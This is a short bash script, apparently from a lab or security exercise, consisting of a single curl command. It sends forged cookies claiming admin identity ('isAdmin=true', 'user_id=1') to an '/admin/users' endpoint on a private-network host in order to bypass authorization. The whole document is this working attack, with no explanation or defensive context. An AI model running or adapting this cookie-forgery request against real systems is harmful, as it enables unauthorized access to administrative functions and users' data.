#!/bin/bash

# Forge admin cookies client-side to bypass authorization
curl -i -b "user=admin; user_id=1; isAdmin=true" http://192.168.0.28:3000/admin/users
